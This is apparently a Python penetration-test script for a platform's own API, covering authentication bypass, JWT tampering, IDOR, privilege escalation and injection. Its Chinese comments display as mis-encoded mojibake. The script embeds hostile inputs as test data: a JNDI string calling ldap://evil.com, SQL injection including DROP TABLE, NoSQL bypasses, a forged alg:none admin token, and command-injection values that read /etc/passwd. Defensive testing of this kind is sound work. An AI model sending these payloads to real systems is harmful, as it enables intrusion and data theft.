#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BehaviorOS V4.0 å®‰å…¨æ¸—é€æµ‹è¯•å¥—ä»¶
Security Penetration Test Suite

è¦†ç›– OWASP Top 10 + è¡Œä¸šç‰¹æœ‰é£é™©:
  T01 â€” è®¤è¯ç»•è¿‡ (Broken Authentication)
  T02 â€” JWT æ“çºµ (Token Manipulation)
  T03 â€” è¶Šæƒè®¿é—® IDOR (Insecure Direct Object Reference)
  T04 â€” è§’è‰²ææƒ (Privilege Escalation)
  T05 â€” æ³¨å…¥æ”»å‡» (Injection: SQLi / NoSQLi / Command)
  T06 â€” XSS å­˜å‚¨å‹ (Stored Cross-Site Scripting)
  T07 â€” é€Ÿç‡é™åˆ¶ (Rate Limiting & Brute Force)
  T08 â€” ä¿¡æ¯æ³„éœ² (Information Disclosure)
  T09 â€” CORS è¯¯é… (CORS Misconfiguration)
  T10 â€” ä¸šåŠ¡é€»è¾‘ (Business Logic Flaws)
  T11 â€” æ‰¹é‡åˆ†é… (Mass Assignment)
  T12 â€” SSRF / è·¯å¾„éå†
  T13 â€” å¥åº·æ•°æ®éšç§ (HIPAA/ä¸ªäººå¥åº·ä¿¡æ¯)

ç”¨æ³•:
  python pentest_bhp.py --base http://localhost:8000/api/v1 [--admin-user admin --admin-pass admin123]

è¾“å‡º: ç»ˆç«¯ + pentest_report.json
"""

import argparse
import json
import sys
import time
import string
import random
import base64
from datetime import datetime, timedelta
from typing import Optional

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("pip install requests")
    sys.exit(1)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# é…ç½®ä¸å…¨å±€çŠ¶æ€
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class PenTestConfig:
    def __init__(self, base: str, admin_user: str, admin_pass: str):
        self.base = base.rstrip("/")
        self.admin_user = admin_user
        self.admin_pass = admin_pass
        self.timeout = 10
        self.session = requests.Session()
        self.session.verify = False

        # æµ‹è¯•ç”¨æˆ·
        ts = int(time.time())
        self.test_user = f"pentest_{ts}"
        self.test_email = f"pentest_{ts}@test.sec"
        self.test_pass = "PenTest123!"

        # ç¬¬äºŒç”¨æˆ· (ç”¨äºIDORæµ‹è¯•)
        self.victim_user = f"victim_{ts}"
        self.victim_email = f"victim_{ts}@test.sec"
        self.victim_pass = "Victim123!"

        # Tokens
        self.admin_token = None
        self.test_token = None
        self.victim_token = None
        self.test_user_id = None
        self.victim_user_id = None
        self.admin_user_id = None

    def url(self, path: str) -> str:
        return f"{self.base}{path}"


class Finding:
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

    def __init__(self, severity: str, category: str, title: str,
                 detail: str, evidence: str = "", remediation: str = ""):
        self.severity = severity
        self.category = category
        self.title = title
        self.detail = detail
        self.evidence = evidence[:500]
        self.remediation = remediation

    def to_dict(self):
        return vars(self)

    def __str__(self):
        icons = {"CRITICAL": "ğŸ”´", "HIGH": "ğŸŸ ", "MEDIUM": "ğŸŸ¡", "LOW": "ğŸ”µ", "INFO": "âšª"}
        return f"  {icons.get(self.severity, 'â“')} [{self.severity}] {self.title}"


# å…¨å±€
findings: list[Finding] = []
test_counts = {"total": 0, "passed": 0, "failed": 0}


def record(finding: Finding):
    findings.append(finding)
    print(finding)
    if finding.evidence:
        print(f"      è¯æ®: {finding.evidence[:120]}")


def test_pass(name: str):
    test_counts["total"] += 1
    test_counts["passed"] += 1
    print(f"  âœ… PASS: {name}")


def test_fail(name: str):
    test_counts["total"] += 1
    test_counts["failed"] += 1


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# è¾…åŠ©å‡½æ•°
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def do_login(cfg: PenTestConfig, username: str, password: str) -> Optional[dict]:
    """ç™»å½•å¹¶è¿”å› {access_token, refresh_token, user}"""
    try:
        r = cfg.session.post(cfg.url("/auth/login"),
                             data={"username": username, "password": password},
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             timeout=cfg.timeout)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def do_register(cfg: PenTestConfig, username: str, email: str, password: str) -> Optional[dict]:
    try:
        r = cfg.session.post(cfg.url("/auth/register"),
                             json={"username": username, "email": email, "password": password},
                             timeout=cfg.timeout)
        if r.status_code in (200, 201):
            return r.json()
    except Exception:
        pass
    return None


def authed_get(cfg: PenTestConfig, path: str, token: str) -> requests.Response:
    return cfg.session.get(cfg.url(path),
                           headers={"Authorization": f"Bearer {token}"},
                           timeout=cfg.timeout)


def authed_post(cfg: PenTestConfig, path: str, token: str, data: dict = None) -> requests.Response:
    return cfg.session.post(cfg.url(path),
                            headers={"Authorization": f"Bearer {token}"},
                            json=data or {},
                            timeout=cfg.timeout)


def authed_put(cfg: PenTestConfig, path: str, token: str, data: dict = None) -> requests.Response:
    return cfg.session.put(cfg.url(path),
                           headers={"Authorization": f"Bearer {token}"},
                           json=data or {},
                           timeout=cfg.timeout)


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# åˆå§‹åŒ–: åˆ›å»ºæµ‹è¯•ç”¨æˆ·
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def setup(cfg: PenTestConfig):
    print("\n" + "=" * 70)
    print("  è¡Œå¥å¹³å° V4.0 å®‰å…¨æ¸—é€æµ‹è¯•")
    print("  ç›®æ ‡: " + cfg.base)
    print("  æ—¶é—´: " + datetime.now().isoformat())
    print("=" * 70)

    # 1. Admin login
    print("\nâ”€â”€ åˆå§‹åŒ– â”€â”€")
    admin_data = do_login(cfg, cfg.admin_user, cfg.admin_pass)
    if admin_data:
        cfg.admin_token = admin_data.get("access_token")
        cfg.admin_user_id = admin_data.get("user", {}).get("id")
        print(f"  âœ“ Admin ç™»å½•æˆåŠŸ (id={cfg.admin_user_id})")
    else:
        print("  âš  Admin ç™»å½•å¤±è´¥, éƒ¨åˆ†æµ‹è¯•å°†è·³è¿‡")

    # 2. Register attacker
    attack_data = do_register(cfg, cfg.test_user, cfg.test_email, cfg.test_pass)
    if attack_data:
        cfg.test_token = attack_data.get("access_token")
        cfg.test_user_id = attack_data.get("user", {}).get("id")
        print(f"  âœ“ æ”»å‡»è€…ç”¨æˆ·æ³¨å†ŒæˆåŠŸ (id={cfg.test_user_id})")
    else:
        # Try login if already exists
        login_data = do_login(cfg, cfg.test_user, cfg.test_pass)
        if login_data:
            cfg.test_token = login_data.get("access_token")
            cfg.test_user_id = login_data.get("user", {}).get("id")
            print(f"  âœ“ æ”»å‡»è€…ç”¨æˆ·å·²å­˜åœ¨, ç™»å½•æˆåŠŸ (id={cfg.test_user_id})")

    # 3. Register victim
    victim_data = do_register(cfg, cfg.victim_user, cfg.victim_email, cfg.victim_pass)
    if victim_data:
        cfg.victim_token = victim_data.get("access_token")
        cfg.victim_user_id = victim_data.get("user", {}).get("id")
        print(f"  âœ“ å—å®³è€…ç”¨æˆ·æ³¨å†ŒæˆåŠŸ (id={cfg.victim_user_id})")
    else:
        login_data = do_login(cfg, cfg.victim_user, cfg.victim_pass)
        if login_data:
            cfg.victim_token = login_data.get("access_token")
            cfg.victim_user_id = login_data.get("user", {}).get("id")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T01 â€” è®¤è¯ç»•è¿‡
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t01_auth_bypass(cfg: PenTestConfig):
    print("\nâ”€â”€ T01: è®¤è¯ç»•è¿‡ â”€â”€")

    protected_endpoints = [
        ("GET", "/auth/me"),
        ("GET", "/journey/state"),
        ("GET", "/credits/my"),
        ("GET", "/micro-actions/today"),
        ("GET", "/challenges/my-enrollments"),
        ("GET", "/chat/sessions"),
        ("GET", "/admin/stats"),
        ("GET", "/coach/dashboard"),
    ]

    # T01.1: æ— Tokenè®¿é—®
    for method, path in protected_endpoints:
        try:
            r = cfg.session.request(method, cfg.url(path), timeout=cfg.timeout)
            if r.status_code not in (401, 403, 422):
                record(Finding(
                    Finding.CRITICAL, "T01", f"æ— Tokenå¯è®¿é—®: {method} {path}",
                    f"è¿”å› {r.status_code}, æœŸæœ› 401/403",
                    evidence=str(r.text[:200]),
                    remediation="æ‰€æœ‰å—ä¿æŠ¤ç«¯ç‚¹å¿…é¡»éªŒè¯ Bearer Token"
                ))
                test_fail(f"T01.1 {path}")
            else:
                test_pass(f"T01.1 {path} éœ€è¦è®¤è¯")
        except Exception:
            pass

    # T01.2: ä¼ªé€ Token
    fake_tokens = [
        "invalid_token_string",
        "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxfQ.fake_signature",
        "",
        "null",
        "undefined",
    ]
    for fake in fake_tokens:
        try:
            r = cfg.session.get(
                cfg.url("/auth/me"),
                headers={"Authorization": f"Bearer {fake}"},
                timeout=cfg.timeout
            )
            if r.status_code == 200:
                record(Finding(
                    Finding.CRITICAL, "T01", "ä¼ªé€ Tokené€šè¿‡éªŒè¯",
                    f"Token '{fake[:30]}...' è¿”å› 200",
                    remediation="éªŒè¯JWTç­¾åå’Œæœ‰æ•ˆæœŸ"
                ))
                test_fail("T01.2 fake token")
            else:
                test_pass(f"T01.2 æ‹’ç»ä¼ªé€ Token")
        except Exception:
            pass

    # T01.3: Authorization Header æ³¨å…¥
    injection_headers = [
        ("Authorization", "Bearer ' OR '1'='1"),
        ("Authorization", "Basic YWRtaW46YWRtaW4="),
        ("Authorization", "Bearer ${jndi:ldap://evil.com}"),
    ]
    for header_name, header_val in injection_headers:
        try:
            r = cfg.session.get(
                cfg.url("/auth/me"),
                headers={header_name: header_val},
                timeout=cfg.timeout
            )
            if r.status_code == 200:
                record(Finding(
                    Finding.HIGH, "T01", f"Headeræ³¨å…¥é€šè¿‡: {header_val[:40]}",
                    f"è¿”å› 200",
                    remediation="ä¸¥æ ¼æ ¡éªŒ Authorization header æ ¼å¼"
                ))
            else:
                test_pass(f"T01.3 æ‹’ç»æ³¨å…¥header")
        except Exception:
            pass

    # T01.4: å¯†ç å¼ºåº¦ (å°è¯•æ³¨å†Œå¼±å¯†ç )
    weak_passwords = ["123", "abc", "1", "aa", "12345"]
    for wp in weak_passwords:
        try:
            ts = int(time.time() * 1000)
            r = cfg.session.post(cfg.url("/auth/register"), json={
                "username": f"weakpw_{ts}",
                "email": f"weak_{ts}@test.com",
                "password": wp
            }, timeout=cfg.timeout)
            if r.status_code in (200, 201):
                record(Finding(
                    Finding.HIGH, "T01", f"å¼±å¯†ç  '{wp}' æ³¨å†ŒæˆåŠŸ",
                    "å¯†ç ç­–ç•¥è¿‡äºå®½æ¾",
                    remediation="è¦æ±‚å¯†ç è‡³å°‘8ä½, åŒ…å«å¤§å°å†™+æ•°å­—+ç‰¹æ®Šå­—ç¬¦"
                ))
                test_fail(f"T01.4 weak password {wp}")
            else:
                test_pass(f"T01.4 æ‹’ç»å¼±å¯†ç  '{wp}'")
        except Exception:
            pass


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T02 â€” JWT Token æ“çºµ
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t02_jwt_manipulation(cfg: PenTestConfig):
    print("\nâ”€â”€ T02: JWT æ“çºµ â”€â”€")

    if not cfg.test_token:
        print("  âš  æ— æµ‹è¯•Token, è·³è¿‡")
        return

    # T02.1: ç®—æ³•æ··æ·† (alg: none)
    # æ„é€  {"alg":"none"}.{"user_id":1,"role":"admin"}.
    header_none = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
    payload_admin = base64.urlsafe_b64encode(
        json.dumps({"user_id": 1, "role": "admin", "exp": int(time.time()) + 3600}).encode()
    ).rstrip(b'=').decode()
    none_token = f"{header_none}.{payload_admin}."

    try:
        r = cfg.session.get(
            cfg.url("/auth/me"),
            headers={"Authorization": f"Bearer {none_token}"},
            timeout=cfg.timeout
        )
        if r.status_code == 200:
            record(Finding(
                Finding.CRITICAL, "T02", "JWT alg:none ç»•è¿‡",
                "æ— ç­¾åJWTè¢«æ¥å—",
                remediation="æœåŠ¡ç«¯å¿…é¡»å¼ºåˆ¶éªŒè¯JWTç­¾åç®—æ³•, æ‹’ç» alg=none"
            ))
        else:
            test_pass("T02.1 æ‹’ç» alg:none Token")
    except Exception:
        pass

    # T02.2: è¿‡æœŸTokené‡æ”¾
    # æˆ‘ä»¬æ²¡æœ‰è¿‡æœŸtoken, ä½†æµ‹è¯•logoutåtokenæ˜¯å¦ä»æœ‰æ•ˆ
    if cfg.test_token:
        # å…ˆä¿å­˜token
        saved_token = cfg.test_token
        # ç™»å‡º
        try:
            cfg.session.post(
                cfg.url("/auth/logout"),
                headers={"Authorization": f"Bearer {saved_token}"},
                timeout=cfg.timeout
            )
        except Exception:
            pass
        # ç­‰ä¸€ç§’åå°è¯•ä½¿ç”¨æ—§token
        time.sleep(1)
        try:
            r = cfg.session.get(
                cfg.url("/auth/me"),
                headers={"Authorization": f"Bearer {saved_token}"},
                timeout=cfg.timeout
            )
            if r.status_code == 200:
                record(Finding(
                    Finding.HIGH, "T02", "ç™»å‡ºåTokenä»æœ‰æ•ˆ",
                    "Tokené»‘åå•æœºåˆ¶å¯èƒ½æœªç”Ÿæ•ˆ",
                    evidence=f"logoutåä½¿ç”¨æ—§token, è¿”å› {r.status_code}",
                    remediation="ç¡®ä¿tokené»‘åå•åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹ä¸€è‡´ (Redis)"
                ))
            else:
                test_pass("T02.2 ç™»å‡ºåTokenå¤±æ•ˆ")
        except Exception:
            pass

        # é‡æ–°ç™»å½•è·å–æ–°token
        login_data = do_login(cfg, cfg.test_user, cfg.test_pass)
        if login_data:
            cfg.test_token = login_data.get("access_token")

    # T02.3: Tokenä¸­roleç¯¡æ”¹
    if cfg.test_token:
        parts = cfg.test_token.split(".")
        if len(parts) == 3:
            try:
                # è§£ç payload
                payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
                payload_json = json.loads(base64.urlsafe_b64decode(payload_b64))
                # ç¯¡æ”¹role
                payload_json["role"] = "admin"
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(payload_json).encode()
                ).rstrip(b'=').decode()
                tampered = f"{parts[0]}.{new_payload}.{parts[2]}"

                r = cfg.session.get(
                    cfg.url("/admin/stats"),
                    headers={"Authorization": f"Bearer {tampered}"},
                    timeout=cfg.timeout
                )
                if r.status_code == 200:
                    record(Finding(
                        Finding.CRITICAL, "T02", "JWT payloadç¯¡æ”¹é€šè¿‡éªŒè¯",
                        "ä¿®æ”¹role=adminåèƒ½è®¿é—®ç®¡ç†ç«¯ç‚¹",
                        remediation="æœåŠ¡ç«¯å¿…é¡»éªŒè¯JWTç­¾åå®Œæ•´æ€§"
                    ))
                else:
                    test_pass("T02.3 æ‹’ç»ç¯¡æ”¹Token")
            except Exception:
                test_pass("T02.3 Tokenæ ¼å¼å®‰å…¨")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T03 â€” IDOR è¶Šæƒè®¿é—®
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t03_idor(cfg: PenTestConfig):
    print("\nâ”€â”€ T03: IDOR è¶Šæƒè®¿é—® â”€â”€")

    if not cfg.test_token or not cfg.victim_user_id:
        print("  âš  ç¼ºå°‘æµ‹è¯•ç”¨æˆ·, è·³è¿‡")
        return

    # T03.1: æ”»å‡»è€…(observer)è®¿é—®å—å®³è€…çš„å­¦ä¹ æ•°æ®
    idor_paths = [
        f"/learning/grower/stats/{cfg.victim_user_id}",
        f"/learning/grower/time/{cfg.victim_user_id}",
        f"/learning/grower/streak/{cfg.victim_user_id}",
        f"/learning/grower/points/{cfg.victim_user_id}",
    ]
    for path in idor_paths:
        try:
            r = authed_get(cfg, path, cfg.test_token)
            if r.status_code == 200:
                record(Finding(
                    Finding.HIGH, "T03", f"IDOR: æ”»å‡»è€…å¯è¯»å–ä»–äººæ•°æ® {path}",
                    f"observerè§’è‰²ç”¨æˆ·å¯è®¿é—®å…¶ä»–ç”¨æˆ·çš„å­¦ä¹ æ•°æ®",
                    evidence=f"GET {path} â†’ 200",
                    remediation="learning_api ä¸­ observer è§’è‰²ä¸åº”æœ‰è·¨ç”¨æˆ·è®¿é—®æƒé™"
                ))
                test_fail(f"T03.1 {path}")
            elif r.status_code == 403:
                test_pass(f"T03.1 {path} è¶Šæƒè¢«æ‹’")
            else:
                test_pass(f"T03.1 {path} è¿”å› {r.status_code}")
        except Exception:
            pass

    # T03.2: è®¿é—®admin_userçš„æ•°æ®
    if cfg.admin_user_id:
        try:
            r = authed_get(cfg, f"/learning/grower/stats/{cfg.admin_user_id}", cfg.test_token)
            if r.status_code == 200:
                record(Finding(
                    Finding.CRITICAL, "T03", "IDOR: æ”»å‡»è€…å¯è¯»å–ç®¡ç†å‘˜å­¦ä¹ æ•°æ®",
                    f"æ™®é€šç”¨æˆ·å¯è®¿é—®ç®¡ç†å‘˜ (id={cfg.admin_user_id}) çš„å­¦ä¹ æ•°æ®",
                    remediation="å¢åŠ ä¸¥æ ¼çš„æ‰€æœ‰æƒæ£€æŸ¥"
                ))
            else:
                test_pass("T03.2 æ— æ³•è¯»å–ç®¡ç†å‘˜æ•°æ®")
        except Exception:
            pass

    # T03.3: IDéå†
    for target_id in [1, 2, 3]:
        if target_id == cfg.test_user_id:
            continue
        try:
            r = authed_get(cfg, f"/learning/grower/stats/{target_id}", cfg.test_token)
            if r.status_code == 200:
                record(Finding(
                    Finding.MEDIUM, "T03", f"IDéå†: å¯è®¿é—® user_id={target_id} çš„æ•°æ®",
                    "é€šè¿‡é€’å¢IDå¯æšä¸¾ç”¨æˆ·æ•°æ®",
                    remediation="ä½¿ç”¨UUIDæ›¿ä»£è‡ªå¢ID, æˆ–ä¸¥æ ¼æ‰€æœ‰æƒæ£€æŸ¥"
                ))
                break
        except Exception:
            pass


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T04 â€” è§’è‰²ææƒ
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t04_privilege_escalation(cfg: PenTestConfig):
    print("\nâ”€â”€ T04: è§’è‰²ææƒ â”€â”€")

    if not cfg.test_token:
        print("  âš  æ— æµ‹è¯•Token, è·³è¿‡")
        return

    # T04.1: æ³¨å†Œæ—¶æŒ‡å®šrole=admin
    ts = int(time.time())
    role_inject_payloads = [
        {"username": f"roletest1_{ts}", "email": f"r1_{ts}@t.com", "password": "Test123!", "role": "admin"},
        {"username": f"roletest2_{ts}", "email": f"r2_{ts}@t.com", "password": "Test123!", "role": "coach"},
        {"username": f"roletest3_{ts}", "email": f"r3_{ts}@t.com", "password": "Test123!", "role": "master"},
    ]
    for payload in role_inject_payloads:
        try:
            r = cfg.session.post(cfg.url("/auth/register"), json=payload, timeout=cfg.timeout)
            if r.status_code in (200, 201):
                user_data = r.json().get("user", {})
                assigned_role = user_data.get("role", "")
                if assigned_role in ("admin", "coach", "master", "promoter"):
                    record(Finding(
                        Finding.CRITICAL, "T04", f"æ³¨å†Œæ—¶æ³¨å…¥è§’è‰² '{payload['role']}' æˆåŠŸ",
                        f"å®é™…åˆ†é…è§’è‰²: {assigned_role}",
                        remediation="æ³¨å†Œç«¯ç‚¹å¿…é¡»å¿½ç•¥å®¢æˆ·ç«¯æä¾›çš„ role å­—æ®µ"
                    ))
                    test_fail(f"T04.1 role inject {payload['role']}")
                else:
                    test_pass(f"T04.1 æ³¨å†Œå¿½ç•¥äº† role={payload['role']}, åˆ†é… {assigned_role}")
        except Exception:
            pass

    # T04.2: æ™®é€šç”¨æˆ·è®¿é—®ç®¡ç†ç«¯ç‚¹
    admin_endpoints = [
        ("GET", "/admin/stats"),
        ("GET", "/admin/users"),
        ("GET", "/governance/dashboard"),
        ("GET", "/safety/logs"),
        ("GET", "/stats/admin/activity-report"),
        ("GET", "/coach/dashboard"),
        ("GET", "/coach/students"),
    ]
    for method, path in admin_endpoints:
        try:
            r = authed_get(cfg, path, cfg.test_token)
            if r.status_code == 200:
                record(Finding(
                    Finding.CRITICAL, "T04", f"observerå¯è®¿é—®ç®¡ç†ç«¯ç‚¹: {path}",
                    "æ™®é€šç”¨æˆ·ç»•è¿‡è§’è‰²æ£€æŸ¥è®¿é—®ç®¡ç†æ¥å£",
                    evidence=f"{method} {path} â†’ 200",
                    remediation="åœ¨è·¯ç”±å±‚å¢åŠ  @require_role('admin') è£…é¥°å™¨"
                ))
                test_fail(f"T04.2 {path}")
            elif r.status_code in (403, 401):
                test_pass(f"T04.2 {path} æƒé™æ‹’ç»")
            else:
                # 404/500 å¯èƒ½æ„å‘³ç€ç«¯ç‚¹ä¸å­˜åœ¨æˆ–å…¶ä»–é—®é¢˜
                test_pass(f"T04.2 {path} è¿”å› {r.status_code}")
        except Exception:
            pass

    # T04.3: ç”¨PUTä¿®æ”¹è‡ªå·±çš„è§’è‰²
    if cfg.test_user_id:
        for role_attempt in ["admin", "coach", "master"]:
            try:
                r = authed_put(cfg, f"/admin/users/{cfg.test_user_id}",
                               cfg.test_token, {"role": role_attempt})
                if r.status_code == 200:
                    # éªŒè¯æ˜¯å¦çœŸçš„æ”¹äº†
                    me = authed_get(cfg, "/auth/me", cfg.test_token)
                    if me.status_code == 200 and me.json().get("role") in ("admin", "coach", "master"):
                        record(Finding(
                            Finding.CRITICAL, "T04",
                            f"è‡ªæˆ‘ææƒæˆåŠŸ: observer â†’ {me.json().get('role')}",
                            "ç”¨æˆ·å¯é€šè¿‡ PUT /admin/users/{è‡ªå·±id} ä¿®æ”¹è‡ªèº«è§’è‰²",
                            remediation="è§’è‰²ä¿®æ”¹å¿…é¡»éªŒè¯æ“ä½œè€…æ˜¯admin"
                        ))
                    else:
                        test_pass(f"T04.3 PUT /admin/users æœªç”Ÿæ•ˆ")
                elif r.status_code in (401, 403):
                    test_pass(f"T04.3 è‡ªæˆ‘ææƒ {role_attempt} è¢«æ‹’")
            except Exception:
                pass


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T05 â€” æ³¨å…¥æ”»å‡»
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t05_injection(cfg: PenTestConfig):
    print("\nâ”€â”€ T05: æ³¨å…¥æ”»å‡» â”€â”€")

    token = cfg.test_token or cfg.admin_token
    if not token:
        print("  âš  æ— Token, è·³è¿‡")
        return

    # T05.1: SQLæ³¨å…¥ â€” ç™»å½•
    sqli_payloads = [
        {"username": "admin' OR '1'='1", "password": "x"},
        {"username": "admin'--", "password": "anything"},
        {"username": "admin' UNION SELECT 1,2,3--", "password": "x"},
        {"username": "1; DROP TABLE users;--", "password": "x"},
    ]
    for payload in sqli_payloads:
        try:
            r = cfg.session.post(cfg.url("/auth/login"), json=payload, timeout=cfg.timeout)
            if r.status_code == 200:
                record(Finding(
                    Finding.CRITICAL, "T05", f"SQLæ³¨å…¥ç™»å½•ç»•è¿‡",
                    f"Payload: {payload['username']}",
                    remediation="ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ (SQLAlchemy ORM å·²å‚æ•°åŒ–, æ£€æŸ¥åŸç”ŸSQL)"
                ))
                test_fail("T05.1 SQLi login")
            else:
                test_pass(f"T05.1 SQLi login æ‹’ç»")
                break  # åªéœ€è¯æ˜ä¸€ä¸ªå¤±è´¥
        except Exception:
            pass

    # T05.2: SQLæ³¨å…¥ â€” æœç´¢/æŸ¥è¯¢å‚æ•°
    sqli_params = [
        "/admin/users?search=' OR 1=1--",
        "/content?category='; DROP TABLE content_items;--",
        "/admin/users?role=admin' UNION SELECT * FROM users--",
    ]
    for path in sqli_params:
        try:
            r = authed_get(cfg, path, token)
            if r.status_code == 200:
                resp_text = r.text
                # æ£€æŸ¥æ˜¯å¦è¿”å›äº†å¼‚å¸¸å¤šçš„æ•°æ® (SQLiæˆåŠŸæ ‡å¿—)
                if len(resp_text) > 10000:
                    record(Finding(
                        Finding.HIGH, "T05", f"ç–‘ä¼¼SQLæ³¨å…¥: {path[:60]}",
                        f"è¿”å›äº†å¼‚å¸¸å¤§çš„å“åº” ({len(resp_text)} bytes)",
                        remediation="æ‰€æœ‰æŸ¥è¯¢å‚æ•°å¿…é¡»å‚æ•°åŒ–"
                    ))
        except Exception:
            pass

    # T05.3: NoSQL / JSONæ³¨å…¥
    nosql_payloads = [
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
    ]
    for payload in nosql_payloads:
        try:
            r = cfg.session.post(cfg.url("/auth/login"), json=payload, timeout=cfg.timeout)
            if r.status_code == 200:
                record(Finding(
                    Finding.CRITICAL, "T05", "NoSQLæ³¨å…¥ç»•è¿‡ç™»å½•",
                    f"Payload: {json.dumps(payload)}",
                    remediation="éªŒè¯è¾“å…¥ç±»å‹, æ‹’ç»éå­—ç¬¦ä¸²çš„ç”¨æˆ·å/å¯†ç "
                ))
        except Exception:
            pass

    test_pass("T05 æ³¨å…¥æ”»å‡»æµ‹è¯•å®Œæˆ")

    # T05.4: å‘½ä»¤æ³¨å…¥ (åœ¨å¯èƒ½æ‰§è¡Œå‘½ä»¤çš„ç«¯ç‚¹)
    cmd_payloads = [
        "; cat /etc/passwd",
        "| ls -la",
        "`whoami`",
        "$(id)",
    ]
    for payload in cmd_payloads:
        try:
            r = authed_post(cfg, "/agent/run", token,
                            {"agent_id": "behavior_rx", "input": payload})
            if r.status_code == 200:
                resp_text = r.text.lower()
                if "root:" in resp_text or "uid=" in resp_text or "bin/" in resp_text:
                    record(Finding(
                        Finding.CRITICAL, "T05", "å‘½ä»¤æ³¨å…¥",
                        f"Agentç«¯ç‚¹æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤",
                        evidence=resp_text[:200],
                        remediation="Agentè¾“å…¥å¿…é¡»æ²™ç®±åŒ–, ç¦æ­¢ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ"
                    ))
        except Exception:
            pass


